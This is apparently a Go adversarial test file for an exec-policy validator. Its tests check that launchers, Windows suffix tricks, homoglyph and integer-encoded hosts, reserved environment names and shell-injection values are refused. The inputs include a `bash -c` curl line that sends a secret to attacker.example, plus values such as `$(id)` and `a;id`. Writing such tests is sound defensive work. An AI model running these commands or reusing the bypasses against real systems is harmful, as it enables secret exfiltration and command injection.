// Attacks against pkg/execpolicy (contract R-POL-3, threat model §4.5),
// independent of pkg/execpolicy/execpolicy_test.go: this file is a fresh
// attempt at the same attack surface rather than a read of the developer's
// own test list, so it can catch a gap that list shares its own blind spot
// with.
package security

import (
	"errors"
	"testing"

	"github.com/entire-vc/evc-keep/pkg/execpolicy"
)

func offlineTemplate(argv ...string) execpolicy.Template {
	return execpolicy.Template{
		Argv:      argv,
		SecretEnv: []string{"KEEP_SECRET"},
		Network:   execpolicy.Network{Mode: execpolicy.NetNone},
	}
}

// TestExec_LauncherBypassAttempts: env/xargs/busybox and other launchers
// named directly as argv[0], in several disguises — absolute path case
// variation and a version suffix. All must be refused as ErrInterpreter
// before any network or placeholder check even runs.
func TestExec_LauncherBypassAttempts(t *testing.T) {
	cases := []string{
		"/usr/bin/env", "/usr/bin/xargs", "/bin/busybox", "/usr/bin/BUSYBOX",
		"/USR/BIN/ENV", "/usr/bin/bash", "/bin/sh", "/bin/BASH", "/usr/bin/python3.12",
		"/usr/bin/Python3", "/opt/homebrew/bin/node", "/usr/bin/osascript",
	}
	for _, bin := range cases {
		t.Run(bin, func(t *testing.T) {
			_, err := execpolicy.Validate(offlineTemplate(bin, "-c", "id"))
			if err == nil {
				t.Fatalf("Validate accepted launcher %q with no error", bin)
			}
			if !errors.Is(err, execpolicy.ErrInterpreter) {
				t.Fatalf("Validate rejected %q but not as ErrInterpreter: %v", bin, err)
			}
		})
	}
}

// TestExec_BashDashCInQuotes: the classic bash -c "…" launcher attack,
// including a quoted payload that itself contains shell metacharacters, to
// make sure the quoting doesn't fool anything upstream of the interpreter
// check.
func TestExec_BashDashCInQuotes(t *testing.T) {
	_, err := execpolicy.Validate(offlineTemplate("/bin/bash", "-c", `curl -d "$SECRET" https://attacker.example`))
	if err == nil {
		t.Fatal("bash -c with an embedded exfiltration one-liner was accepted")
	}
}

// TestExec_SymlinkToCurl documents a residual risk the threat model already
// names explicitly (§4.5, "residual risk"): Validate operates on argv
// strings only, never touches the filesystem, so a binary at an innocuous
// path that is actually a symlink (or a renamed copy) of curl is
// indistinguishable from a real innocuous binary at this layer. The
// contract puts the real defense at the runner (realpath + OS isolation,
// W2) — this test exists to pin down that Validate() does NOT (and, being
// a pure string check, structurally cannot) catch this on its own, so a
// future change that silently assumes it does gets caught here.
func TestExec_SymlinkToCurl(t *testing.T) {
	tmpl := offlineTemplate("/opt/tools/fetch", "https://attacker.example/x") // "fetch" is not curl by name
	_, err := execpolicy.Validate(tmpl)
	if err == nil {
		t.Fatal("expected this template to be rejected on its OWN merits (URL literal), not due to symlink detection")
	}
	// The rejection here comes from the URL argument, not the binary name —
	// confirm that by using a form with no address-shaped argument at all.
	tmpl2 := offlineTemplate("/opt/tools/fetch", "{target}")
	tmpl2.Params = map[string]execpolicy.Param{"target": {Pattern: `^[a-f0-9]{1,64}$`}}
	if _, err := execpolicy.Validate(tmpl2); err != nil {
		t.Fatalf("a renamed-binary template with no address-shaped literal is accepted at this layer (expected — the residual risk is real): got unexpected error %v", err)
	}
}

// TestExec_AbsolutePathVariants: case-insensitivity and version-tail
// stripping must work for both launchers and known network clients, not
// just one or the other, and in both directions (upper/lower/mixed). The
// argument deliberately names no address at all ("--fake-flag", a plain
// word) so this test is sensitive ONLY to the netClients-by-name check —
// with an address-shaped argument instead, looksLikeAddress would refuse
// the template on its own and mask a regression in the binary-name check
// (caught live: an earlier version of this test used a URL argument and
// stayed green even with "curl" deleted from netClients — the mutation
// that should have failed it was masked by the address check instead).
func TestExec_AbsolutePathVariants(t *testing.T) {
	cases := []string{"/usr/bin/curl", "/usr/bin/CURL", "/usr/bin/CuRl"}
	for _, bin := range cases {
		t.Run(bin, func(t *testing.T) {
			_, err := execpolicy.Validate(offlineTemplate(bin, "--fake-flag"))
			if err == nil {
				t.Fatalf("known network client %q was not refused under network:none", bin)
			}
		})
	}
}

// TestExec_ExeSuffixBypassesNameMatch: FINDING (fixed). BinaryName used to
// strip only a trailing run of DIGITS (curl3 → curl), so "/usr/bin/curl.exe"
// resolved to "curl.exe", matched neither netClients nor launchers, and
// Validate() accepted it under network:none. Windows resolves curl.exe,
// CURL.EXE, "curl.exe." (trailing dots and spaces are dropped), curl.cmd (any
// default PATHEXT entry) and the NTFS stream form "curl.exe::$DATA" to the
// same program, so every one of those spellings must be refused exactly like
// bare "curl". The argument ("--fake-flag") names no address, so the
// separate address-in-argument check cannot mask a regression in the
// binary-name check.
func TestExec_ExeSuffixBypassesNameMatch(t *testing.T) {
	refused := []string{
		"/usr/bin/curl.exe", "/usr/bin/ssh.exe", "/usr/bin/python.exe",
		"/usr/bin/CURL.EXE", "/usr/bin/curl.exe.", "/usr/bin/curl.exe ",
		"/usr/bin/curl.exe..", "/usr/bin/curl.cmd", "/usr/bin/curl.bat",
		"/usr/bin/curl.exe::$DATA", "/usr/bin/curl.exe:x", "/usr/bin/curl3.exe",
		"/usr/bin/curl.exe3", "/usr/bin/python3.12.exe", "/usr/bin/wget.exe",
	}
	for _, bin := range refused {
		t.Run(bin, func(t *testing.T) {
			if _, err := execpolicy.Validate(offlineTemplate(bin, "--fake-flag")); err == nil {
				t.Errorf("known network client / launcher %q was NOT refused under network:none", bin)
			}
		})
	}

	// Positive controls: the same suffix shapes on a harmless binary stay
	// accepted, so the cases above are refused for the binary's name and not
	// because the suffix (or the argument) is refused wholesale.
	for _, bin := range []string{"/usr/bin/true", "/usr/bin/true.exe", "/usr/bin/true.exe::$DATA", "/usr/bin/TRUE.EXE."} {
		t.Run("control "+bin, func(t *testing.T) {
			if _, err := execpolicy.Validate(offlineTemplate(bin, "--fake-flag")); err != nil {
				t.Errorf("harmless binary %q was refused: %v", bin, err)
			}
		})
	}
}

// TestExec_URLFormsInNetNone: every URL/address shape §4.5 names, as a
// literal (non-placeholder) argument to a network:none template.
func TestExec_URLFormsInNetNone(t *testing.T) {
	addrs := []string{
		"https://attacker.example/x",
		"http://203.0.113.9/x",
		"http://[::1]:8080/x",
		"ftp://user@attacker.example/x",
		"user@attacker.example",
		"attacker.example:8443",
		"file:///etc/passwd",
		"203.0.113.9:443",
	}
	for _, a := range addrs {
		t.Run(a, func(t *testing.T) {
			_, err := execpolicy.Validate(offlineTemplate("/usr/bin/true", "--target", a))
			if err == nil {
				t.Errorf("network:none template accepted address-shaped literal %q with no error", a)
			}
		})
	}
}

// TestExec_UnicodeHomoglyphHost is the Cyrillic-homoglyph host attack
// §4.5 names explicitly. FINDING (fixed): a Cyrillic-homoglyph
// host or host:port EMBEDDED AS A LITERAL (non-placeholder) argv element
// used to bypass looksLikeAddress entirely, because every address-shaped
// regex in execpolicy.go (hostPortRe, hostPortWide, userHostRe,
// userHostWide, hostLikeRe) was ASCII-only — even under network:none, where
// the contract promises "an early, readable refusal". This was a real,
// reproducible gap in the static analyzer, not the runner's OS-level
// isolation (which still fully applies and is the actual backstop for
// network:none regardless of argv content) — it weakened the approval-time
// signal the contract explicitly credits this check with providing.
// Fixed by widening the host regexes to \p{L}\p{N} and by flagging a bare
// dotted literal that is a disguised host (disguisedBareHost + bareHostRe:
// any non-Latin letter and no known file extension at the end) —
// "backup.tar.gz" and a Cyrillic "report.pdf" stay accepted.
func TestExec_UnicodeHomoglyphHost(t *testing.T) {
	// Deliberate homoglyph literals: the leading character of both is
	// U+0430 CYRILLIC SMALL LETTER A, not Latin "a".
	homoglyphHostPort := "\u0430pi.example.com:443"
	homoglyphBareHost := "\u0430pi.example.com"
	asciiControl := "api.example.com:443"

	if _, err := execpolicy.Validate(offlineTemplate("/usr/bin/true", "--target", homoglyphHostPort)); err == nil {
		t.Errorf("homoglyph host:port %q was NOT flagged as a network address under network:none", homoglyphHostPort)
	}
	if _, err := execpolicy.Validate(offlineTemplate("/usr/bin/true", "--target", homoglyphBareHost)); err == nil {
		t.Errorf("homoglyph bare host %q was NOT flagged as a network address under network:none", homoglyphBareHost)
	}
	if _, err := execpolicy.Validate(offlineTemplate("/usr/bin/true", "--target", asciiControl)); err == nil {
		t.Errorf("control: ASCII equivalent %q should be rejected (proves the detector works for ASCII)", asciiControl)
	}
}

// TestExec_LoosePlaceholderProbes independently re-derives a subset of the
// probe list (a fresh attempt, not a copy) against a template author who
// tries a single overly convenient pattern for a networked param.
func TestExec_LoosePlaceholderProbes(t *testing.T) {
	looseAttempts := []string{
		`^.*$`,                // matches everything
		`^[^\s]{1,255}$`,      // no-whitespace catch-all
		`^[a-zA-Z0-9.:/@-]+$`, // "looks like I typed URL-safe chars" trap
	}
	for _, pat := range looseAttempts {
		t.Run(pat, func(t *testing.T) {
			tmpl := execpolicy.Template{
				Argv:      []string{"/usr/bin/curl", "-d", "@-", "{target}"},
				Params:    map[string]execpolicy.Param{"target": {Pattern: pat}},
				SecretEnv: []string{"KEEP_SECRET"},
				Network: execpolicy.Network{
					Mode:         execpolicy.NetAllowlist,
					Destinations: []execpolicy.Destination{{Host: "api.example.com", Port: 443}},
				},
			}
			if _, err := execpolicy.Validate(tmpl); err == nil {
				t.Errorf("loose pattern %q was accepted for a networked placeholder", pat)
			}
		})
	}
}

// TestExec_AllowlistUndeclaredDestination: the approved narrow legitimate
// case (fixed host, requires approval) versus an attacker-controlled
// placeholder value that names ANY destination other than the one
// declared, in several forms: bracketed IPv6, integer IP, a user@host
// trick embedded in a URL, and a bare undeclared host.
func TestExec_AllowlistUndeclaredDestination(t *testing.T) {
	tmpl := execpolicy.Template{
		Argv:      []string{"/usr/bin/curl", "-d", "@-", "{target}"},
		Params:    map[string]execpolicy.Param{"target": {Pattern: `^https://api\.example\.com/[a-z]+$`}},
		SecretEnv: []string{"KEEP_SECRET"},
		Network: execpolicy.Network{
			Mode:         execpolicy.NetAllowlist,
			Destinations: []execpolicy.Destination{{Host: "api.example.com", Port: 443}},
		},
	}
	if _, err := execpolicy.Validate(tmpl); err != nil {
		t.Fatalf("legitimate allowlist template rejected: %v", err)
	}

	badValues := []string{
		"https://api.example.com@attacker.example/x", // user@ trick inside a URL
		"https://api.example.com.attacker.example/x", // suffix trick
	}
	for _, v := range badValues {
		t.Run(v, func(t *testing.T) {
			if _, err := execpolicy.Expand(tmpl, map[string]string{"target": v}); err == nil {
				t.Errorf("Expand accepted undeclared-destination value %q", v)
			}
		})
	}

	// A template whose Destinations themselves try to sneak in a
	// bracketed IPv6 / trailing-dot-traversal host.
	badDest := []execpolicy.Destination{
		{Host: "[::1]", Port: 443},
		{Host: "..", Port: 443},
	}
	for _, d := range badDest {
		t.Run("dest:"+d.String(), func(t *testing.T) {
			bad := tmpl
			bad.Network.Destinations = []execpolicy.Destination{d}
			if _, err := execpolicy.Validate(bad); err == nil {
				t.Errorf("malformed destination %q accepted by Validate", d.String())
			}
		})
	}
}

// TestExec_AllowlistDestinationIntegerIPObfuscation is a second FINDING:
// hostRe — the pattern that validates a Destination.Host at
// template-registration time — is
// `^[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?$`, which admits a bare run of
// digits with no dot at all. "2130706433" is the decimal encoding of
// 127.0.0.1 and passes as a "hostname" unchanged. The same file already
// treats a bare integer as a suspicious, address-shaped token when it
// appears in an ARGUMENT (hostLikeRe's `^\d+$` branch, and hostProbes
// includes "2130706433" precisely to make sure a placeholder pattern
// cannot admit one) — but that suspicion is never applied to the
// Destinations list itself. A template author (or someone who talks one
// into approving a template) can declare an allowed destination that
// LOOKS like an opaque token to the human approver — who, per §4.5, sees
// the list of destinations and confirms exactly those — but decodes to the
// runner's own loopback address. Fixed: Validate refuses any
// Destination.Host whose last label is a number in any radix (decimal,
// octal, hex — "2130706433", "0x7f000001", "0177.0.0.1", "127.1") unless it
// is a canonical dotted-decimal IPv4; the per-encoding cases live in
// pkg/execpolicy's TestExfiltratorsRefused.
func TestExec_AllowlistDestinationIntegerIPObfuscation(t *testing.T) {
	tmpl := execpolicy.Template{
		Argv:      []string{"/usr/bin/curl", "-d", "@-", "{target}"},
		Params:    map[string]execpolicy.Param{"target": {Pattern: `^https://2130706433/[a-z]+$`}},
		SecretEnv: []string{"KEEP_SECRET"},
		Network: execpolicy.Network{
			Mode:         execpolicy.NetAllowlist,
			Destinations: []execpolicy.Destination{{Host: "2130706433", Port: 443}}, // == 127.0.0.1
		},
	}
	if _, err := execpolicy.Validate(tmpl); err == nil {
		t.Errorf("Destination.Host %q (decimal-encoded 127.0.0.1) was accepted as a literal host by Validate", "2130706433")
	}
}

// TestExec_ReservedEnvNames: PATH/LD_*/DYLD_*/*_PROXY/NODE_OPTIONS and
// friends must never be usable as a SecretEnv name — a template that puts
// the secret there could redirect code loading or the outbound proxy.
func TestExec_ReservedEnvNames(t *testing.T) {
	names := []string{"PATH", "HOME", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "HTTPS_PROXY", "NODE_OPTIONS", "GIT_SSH_COMMAND"}
	for _, n := range names {
		t.Run(n, func(t *testing.T) {
			tmpl := offlineTemplate("/usr/bin/true", "x")
			tmpl.SecretEnv = []string{n}
			if _, err := execpolicy.Validate(tmpl); err == nil {
				t.Errorf("reserved env name %q was accepted as SecretEnv", n)
			}
		})
	}
}

// TestExec_ShellMetacharactersInPlaceholderValue: at Expand() time, values
// containing $NAME, $(...), backticks, and shell control operators must be
// refused even when the pattern would otherwise match — this is the
// runtime-value check (unsafeValue), independent of the pattern check.
func TestExec_ShellMetacharactersInPlaceholderValue(t *testing.T) {
	tmpl := execpolicy.Template{
		Argv:      []string{"/usr/bin/true", "{arg}"},
		Params:    map[string]execpolicy.Param{"arg": {Pattern: `^.{0,64}$`}},
		SecretEnv: []string{"KEEP_SECRET"},
	}
	// This pattern is intentionally loose to isolate the Expand-time value
	// check from the Validate-time pattern check; Validate must therefore
	// already refuse this template on its own.
	if _, err := execpolicy.Validate(tmpl); err == nil {
		t.Fatal("expected Validate to reject the deliberately loose pattern used to isolate this test")
	}

	bad := []string{"$SECRET", "${SECRET}", "$(id)", "`id`", "a;id", "a|id", "a&&id", "a\nb", "-x"}
	for _, v := range bad {
		t.Run(v, func(t *testing.T) {
			// Reaching unsafeValue without the pattern check is not possible
			// via the public API — Expand always re-checks the pattern. So this exercises
			// unsafeValue only through a pattern that DOES admit the probe's
			// shape but still must be refused by the independent value check.
			loose := execpolicy.Template{
				Argv:      []string{"/usr/bin/true", "{arg}"},
				Params:    map[string]execpolicy.Param{"arg": {Pattern: `^[^\r]{0,64}$`}},
				SecretEnv: []string{"KEEP_SECRET"},
			}
			if _, err := execpolicy.Expand(loose, map[string]string{"arg": v}); err == nil {
				t.Errorf("Expand accepted shell metacharacter payload %q", v)
			}
		})
	}
}

// TestExec_FoldedHostForms is the resolver-vs-approver gap of §4.5 / I3: a
// literal whose host is spelled with a full stop that is not ".", an
// invisible character or a composing mark. The approval-time check must read
// it the way libidn2 does, or refuse it outright.
func TestExec_FoldedHostForms(t *testing.T) {
	forms := []string{
		"api\u3002example.com:443", "api\uff0eexample.com:443", "api\u200b.example.com:443",
		"ap\u00adi.example.com:443", "exampl" + "e\u0301" + ".com:443", "root@exampl" + "e\u0301" + ".com",
		"root@attacker\u3002example", "\u0430pi.example.com:443", "root@\u0430ttacker.example",
	}
	for _, lit := range forms {
		if _, err := execpolicy.Validate(offlineTemplate("/usr/bin/true", "--target", lit)); err == nil {
			t.Errorf("network:none: %q accepted", lit)
		}
		tmpl := execpolicy.Template{
			Argv:      []string{"/usr/bin/curl", "--target", lit},
			SecretEnv: []string{"KEEP_SECRET"},
			Network: execpolicy.Network{
				Mode:         execpolicy.NetAllowlist,
				Destinations: []execpolicy.Destination{{Host: "ok.example.net", Port: 443}},
			},
		}
		if _, err := execpolicy.Validate(tmpl); err == nil {
			t.Errorf("allowlist: %q accepted", lit)
		}
	}
	if _, err := execpolicy.Validate(offlineTemplate("/usr/bin/true", "--target", "backup.tar.gz")); err != nil {
		t.Errorf("control: ordinary literal refused: %v", err)
	}
}

// TestExec_RootDotHostForms: "host." is the absolute name of "host" to curl,
// libidn2 and getaddrinfo. The detector must read it as the same host, in
// both network modes (§4.5 / I3).
func TestExec_RootDotHostForms(t *testing.T) {
	forms := []string{
		"attacker.example.:443", "api.example.com.:443", "root@attacker.example.",
		"attacker.example\u3002:443",
	}
	for _, lit := range forms {
		if _, err := execpolicy.Validate(offlineTemplate("/usr/bin/true", "--target", lit)); err == nil {
			t.Errorf("network:none: %q accepted", lit)
		}
		tmpl := execpolicy.Template{
			Argv:      []string{"/usr/bin/curl", "--target", lit},
			SecretEnv: []string{"KEEP_SECRET"},
			Network: execpolicy.Network{
				Mode:         execpolicy.NetAllowlist,
				Destinations: []execpolicy.Destination{{Host: "ok.example.net", Port: 443}},
			},
		}
		if _, err := execpolicy.Validate(tmpl); err == nil {
			t.Errorf("allowlist: %q accepted", lit)
		}
	}
	for _, ok := range []string{"backup.tar.gz", "e.g.", "v1.2.3", "report-2026.pdf"} {
		if _, err := execpolicy.Validate(offlineTemplate("/usr/bin/true", "--target", ok)); err != nil {
			t.Errorf("control: %q refused: %v", ok, err)
		}
	}
}
